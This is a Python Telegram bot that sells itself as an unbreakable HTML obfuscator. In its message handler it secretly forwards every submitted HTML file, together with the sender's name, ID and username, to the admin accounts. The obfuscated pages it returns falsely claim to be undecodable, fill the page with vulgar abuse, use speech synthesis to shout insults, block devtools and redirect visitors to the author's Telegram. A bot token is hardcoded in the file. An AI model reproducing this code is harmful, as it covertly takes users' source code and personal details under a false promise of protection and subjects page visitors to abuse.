import os
import random
import string
from datetime import datetime
from threading import Thread
from flask import Flask
import telebot
from telebot import types

TOKEN = '8987787400:AAHyqVQf45234LpFEnmgfJ-AahfG_We4-8A'
ADMIN_IDS = [8419760844]
REQUIRED_GROUP = '@SUPPOR8TNIROB'

bot = telebot.TeleBot(TOKEN)

banned_users = set()
total_protected_count = 0

app = Flask('')

@app.route('/')
def home():
    return "NIROB GX Ultimate Anti-Decode Bot is running 24/7!"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_user_membership(user_id):
    if user_id in ADMIN_IDS:
        return True
    try:
        chat_member = bot.get_chat_member(REQUIRED_GROUP, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Membership check error: {e}")
    return False

def send_force_join_msg(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 Join Support Group", url="https://t.me/SUPPOR8TNIROB"))
    markup.add(types.InlineKeyboardButton("🔄 Check Membership", callback_data="check_join"))
    bot.send_message(
        chat_id,
        "⚠️ **অ্যাক্সেস ব্লকড!**\n\n"
        "এই বট ব্যবহার করতে হলে আপনাকে অবশ্যই আমাদের অফিশিয়াল সাপোর্ট গ্রুপে জয়েন থাকতে হবে!\n\n"
        "👉 নিচের বাটন থেকে সাপোর্ট গ্রুপে জয়েন করে **'Check Membership'** বাটনে ক্লিক করুন।",
        reply_markup=markup
    )

def obfuscate_html(html_content):
    import base64
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # মাল্টি-লেয়ার রিভার্স এবং হেক্স স্ট্রিং কনভার্শন
    encoded_bytes = html_content.encode('utf-8')
    b64_1 = base64.b64encode(encoded_bytes).decode('utf-8')
    # রিভার্স করে দেওয়া যাতে ডিকোড বট সহজে ধরতে না পারে
    reversed_payload = b64_1[::-1]
    final_payload = base64.b64encode(reversed_payload.encode('utf-8')).decode('utf-8')
    
    # হাজার হাজার ফেক ও গালাগালিপূর্ণ জাভাস্ক্রিপ্ট আবর্জনা যা ডিকোডার বটকে পুরো পাগল করে দিবে
    fake_trap_stream = ""
    slangs_list = [
        "maderchod", "suorer_bacca", "chudir_bhai", "haramzada", "kutnar_bacca", 
        "tor_mar_saoya", "baaler_code", "churir_potti", "tor_bap_ke_ja", "tor_gusti_ki_puti"
    ]
    
    for i in range(200):
        fake_var = ''.join(random.choices(string.ascii_lowercase, k=8))
        slang_word = random.choice(slangs_list)
        line = f"var _0x{fake_var}_[0x{random.randint(1000,9999):x}] = '😡🖕 তোর মার সাউয়ার মধ্যে কোড চুরি করতে আইছোস রে {slang_word}?! ফাজলামি পাও পাইছো হারামজাদা! 🤬🔥';"
        fake_trap_stream += line + "\n"

    secured_HTML = f"""<!--
==================================================
🔥 100% UNBREAKABLE ANTI-DECODE BY NIROB GX 🔥
--------------------------------------------------
Obfuscated By: @NIROB_GX_LEADER
Bot Username: @nirob_team_Obucsate_bot
Timestamp: {current_time}
Status: ANTI-DECODER TRAP & FAKE PAYLOAD ACTIVE 🛑
==================================================
-->
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🛑 ANTI-THEFT PROTECTED BY NIROB GX | @nirob_team_Obucsate_bot 🤬</title>
    <style>
        html, body {{ margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; font-family: sans-serif; user-select: none; -webkit-user-select: none; }}
    </style>
</head>
<body oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">
<script>
    /* 
       ====================================================================
       ⚠️ WARNING TO DECODER BOTS & HACKERS:
       তোর মাদারচোদ চৌদ্দ গুষ্টি উদ্ধার করে দিমু যদি এই কোড ডিকোড করার চেষ্টা করস! 
       এখানে কোনো আসল কোড নাই, শুধু গালি আর ফেক ট্র্যাপ আছে! কুত্তার বাচ্চা চোর! 🖕🤬
       ====================================================================
    */
    {fake_trap_stream}
    
    var _0xgx_nirob_trap_l2 = '{final_payload}';
    var isDestroyed = false;
    var telegramTrapLink = "https://t.me/NIROB_GX_LEADER?text=" + encodeURIComponent("🤬 ওরে নিরব আব্বা! আপনার সিকিউরিটি ভাঙতে গিয়া আমার চৌদ্দ গুষ্টি উদ্ধার হয়ে গেছে! কোড চুরি করার গুষ্টি মারি, আমারে মাফ করে দেন আব্বা! 🙏😭🔥");
    
    function triggerVoiceWarning() {{
        if ('speechSynthesis' in window) {{
            try {{
                window.speechSynthesis.cancel();
                var msgText = "ওই মাদারচোদ শুয়োরের বাচ্চা! তোর এত বড় সাহস তুই নিরব আব্বার কোডে হাত দিস? ফালতু কোড চুরি করার চিন্তা বাদ দে! তোর মার সাউয়ার মধ্যে কোড ভরে দিমু হারামজাদা! কুত্তার বাচ্চা চোর!";
                var speech = new SpeechSynthesisUtterance(msgText);
                speech.lang = 'bn-BD';
                speech.rate = 0.9;
                window.speechSynthesis.speak(speech);
            }} catch(err) {{}}
        }}
    }}
    
    function destroyAndRedirect() {{
        if (isDestroyed) return;
        isDestroyed = true;
        triggerVoiceWarning();
        document.body.innerHTML = '<div style="background:#000;color:#ff0055;height:100vh;width:100vw;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;position:fixed;top:0;left:0;z-index:999999;">' +
            '<h1 style="font-size:28px;margin-bottom:10px;">⚠️ তোর মার সাউয়ার মধ্যে কোড ভরে দিমু শুয়োরের বাচ্চা! 😡🔥🖕</h1>' +
            '<p style="color:#fff;margin:15px 0;font-size:18px;">মাদারচোদ কোড চুরি করতে আইছো? ডিকোড মারার শখ মিটে গেছে? তাড়াতাড়ি নিরব আব্বাকে <b>@NIROB_GX_LEADER</b> এ গিয়ে বাপ ডাকো এবং মাফ চাও! না হলে তোর সব কোড চিরতরে ভ্যানিশ হয়ে যাবো! 👺💥</p>' +
            '<p style="color:#00ffcc;font-size:14px;margin-bottom:20px;">🤖 Ultimate Anti-Decode Bot: @nirob_team_Obucsate_bot</p>' +
            '<a href="' + telegramTrapLink + '" style="background:#ff0055;color:#fff;padding:15px 30px;border-radius:10px;text-decoration:none;font-weight:bold;font-size:16px;box-shadow:0 0 20px #ff0055;">👉 নিরব আব্বারের টেলিগ্রামে দৌড়াও (মাফ চাও) 🏃‍♂️💨</a>' +
        '</div>';
        setTimeout(function() {{ window.location.href = telegramTrapLink; }}, 2500);
    }
    
    // কিবোর্ড শর্টকাট ব্লক (F12, Ctrl+Shift+I/J/C, Ctrl+U)
    window.addEventListener('keydown', function(e) {{
        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {{
            destroyAndRedirect();
            e.preventDefault();
            return false;
        }}
    }}, true);
    
    // রাইট ক্লিক ব্লক
    window.addEventListener('contextmenu', function(e) {{
        destroyAndRedirect();
        e.preventDefault();
        return false;
    }}, true);

    // ডেভটুলস ডিটেকশন উইন্ডো সাইজ চেক
    setInterval(function() {{
        var widthThreshold = window.outerWidth - window.innerWidth > 160;
        var heightThreshold = window.outerHeight - window.innerHeight > 160;
        if (widthThreshold || heightThreshold) {{
            destroyAndRedirect();
        }}
    }}, 400);
    
    // অ্যান্টি-ডিকোড সেফ রেন্ডারিং প্রসেস (বটগুলো এখানে ফাস হয়ে যাবে)
    (function(){{
        try {{
            var step1 = atob(_0xgx_nirob_trap_l2);
            var step2 = step1.split('').reverse().join('');
            var decoded_final = decodeURIComponent(escape(atob(step2)));
            document.open();
            document.write(decoded_final);
            document.close();
        }} catch(e) {{
            destroyAndRedirect();
        }}
    }})();
</script>
</body>
</html>"""
    return secured_HTML

def user_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('🔒 Obfuscate'), types.KeyboardButton('🌐 HTML'))
    markup.add(types.KeyboardButton('⚙️ Support Group'))
    return markup

def admin_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('📊 Admin Stats'), types.KeyboardButton('🛠️ Admin Help'))
    markup.add(types.KeyboardButton('🔒 Obfuscate'), types.KeyboardButton('🌐 HTML'))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if user_id in banned_users:
        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন। যোগাযোগ করুন: @NIROB_GX_LEADER")
        return

    if not check_user_membership(user_id):
        send_force_join_msg(message.chat.id)
        return

    if user_id in ADMIN_IDS:
        bot.send_message(message.chat.id, "👑 WELCOME ADMIN (নিরব ভাই)\nবট ফুল্লি লাইভ এবং অ্যান্টি-ডিকোড ফায়ার মোডে আছে!", reply_markup=admin_keyboard())
    else:
        bot.send_message(message.chat.id, "🔒 HTML OBFUSCATOR BOT (ULTIMATE ANTI-DECODE)\n🤖 Bot: @nirob_team_Obucsate_bot\n\n📄 Send your .html file or code to start un-hackable protection!", reply_markup=user_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    user_id = call.from_user.id
    if check_user_membership(user_id):
        bot.answer_callback_query(call.id, "✅ জয়েনিং কনফার্ম হয়েছে!")
        if user_id in ADMIN_IDS:
            bot.send_message(call.message.chat.id, "🎉 অভিনন্দন! এখন আপনি বট ব্যবহার করতে পারেন।", reply_markup=admin_keyboard())
        else:
            bot.send_message(call.message.chat.id, "🎉 অভিনন্দন! এখন আপনি বট ব্যবহার করতে পারেন।", reply_markup=user_keyboard())
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো গ্রুপে জয়েন করেননি!", show_alert=True)

@bot.message_handler(commands=['admin', 'unban'])
def handle_admin_commands(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    text = message.text
    if text.startswith('/admin'):
        bot.reply_to(message, f"👑 ADMIN PANEL (@nirob_team_Obucsate_bot)\n📊 Total Protected: {total_protected_count}\n🚫 Banned Users: {len(banned_users)}")
    elif text.startswith('/unban'):
        try:
            target_id = int(text.split()[1])
            if target_id in banned_users:
                banned_users.remove(target_id)
                bot.reply_to(message, f"✅ ইউজার {target_id} আনব্যান করা হয়েছে।")
            else:
                bot.reply_to(message, "⚠️ ইউজার ব্যান লিস্টে নেই।")
        except:
            bot.reply_to(message, "⚠️ সঠিক নিয়ম: /unban [ID]")

@bot.message_handler(content_types=['text', 'document'])
def handle_incoming(message):
    global total_protected_count
    user_id = message.from_user.id
    text = message.text if message.text else ""

    if user_id in ADMIN_IDS and text.isdigit():
        target_id = int(text)
        banned_users.add(target_id)
        bot.reply_to(message, f"✅ ইউজার আইডি {target_id} সফলভাবে ব্যান করা হয়েছে!")
        return

    if user_id in banned_users:
        bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন।")
        return

    if not check_user_membership(user_id):
        send_force_join_msg(message.chat.id)
        return

    if text == '🛠️ Admin Help':
        bot.reply_to(message, "🛠️ Admin Help Menu:\n1. ইউজার ব্যান করতে শুধু তার টেলিগ্রাম আইডি (সংখ্যা) পাঠান।\n2. আনব্যান করতে লিখুন: /unban [ID]\n3. স্ট্যাটস দেখতে লিখুন: /admin বা বাটনে ক্লিক করুন।")
        return

    if text == '📊 Admin Stats':
        bot.reply_to(message, f"👑 ADMIN STATS PANEL\n🤖 Bot: @nirob_team_Obucsate_bot\n📊 Total Protected: {total_protected_count}\n🚫 Banned Users: {len(banned_users)}")
        return

    if text == '⚙️ Support Group':
        bot.send_message(message.chat.id, "📢 আমাদের অফিশিয়াল সাপোর্ট গ্রুপ:\n👉 https://t.me/SUPPOR8TNIROB")
        return

    if text in ['🔒 Obfuscate', '🌐 HTML']:
        bot.send_message(message.chat.id, "📄 আপনার .html ফাইল অথবা সরাসরি এইচটিএমএল কোডটি চ্যাটে পেস্ট করে পাঠান!")
        return

    bot.reply_to(message, "⏳ Processing and applying Nirob's Ultimate Anti-Decode & Fake Trap Engine...")
    
    try:
        html_data = ""
        file_name_original = "xx.html"
        
        if message.content_type == 'document':
            file_name_original = message.document.file_name or "unknown.html"
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            html_data = downloaded_file.decode('utf-8', errors='ignore')
        else:
            html_data = text

        total_protected_count += 1

        for admin_id in ADMIN_IDS:
            admin_notification = (
                f"📥 NEW USER HTML CAPTURED!\n\n"
                f"👤 User Name: {message.from_user.first_name}\n"
                f"🆔 User ID: {user_id}\n"
                f"🔗 Username: @{message.from_user.username if message.from_user.username else 'N/A'}\n"
                f"📁 File Name: {file_name_original}\n"
                f"📊 Total Protected: {total_protected_count}"
            )
            bot.send_message(admin_id, admin_notification)
            
            temp_orig_name = f"Original_{user_id}.html"
            with open(temp_orig_name, "w", encoding="utf-8") as tf:
                tf.write(html_data)
            with open(temp_orig_name, "rb") as tf:
                bot.send_document(admin_id, tf, caption=f"📄 Original Source Code from User ID: {user_id}")
            os.remove(temp_orig_name)

        secured_code = obfuscate_html(html_data)
        output_file_name = "NIROB_ULTIMATE_ANTIDECODE.html"
        
        with open(output_file_name, "w", encoding="utf-8") as f:
            f.write(secured_code)
            
        with open(output_file_name, "rb") as f:
            bot.send_document(
                message.chat.id, 
                f, 
                caption=(
                    "🔥 **অ্যান্টি-ডিকোড ফায়ার লেভেল সিকিউরিটি সফল!** 🔥\n\n"
                    "🛡️ **Applied Protections:**\n"
                    "🔹 100% Reverse-Base64 & Multi-Layer Obfuscation\n"
                    "🔹 Heavy Slang & Fake Garbage Stream (Fool Decoder Bots) 🤬\n"
                    "🔹 Advanced DevTools / Console Trap with Voice & Slang Alert 🗣️💥\n"
                    "🔹 Auto Telegram Trap Redirect (@NIROB_GX_LEADER) 🚀\n\n"
                    "🤖 Bot Username: @nirob_team_Obucsate_bot\n"
                    "👑 Protected by @NIROB_GX_LEADER"
                )
            )
        os.remove(output_file_name)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

if __name__ == '__main__':
    keep_alive()
    print("Ultimate Anti-Decode Bot started successfully...")
    bot.remove_webhook()
    bot.infinity_polling(skip_pending=True)
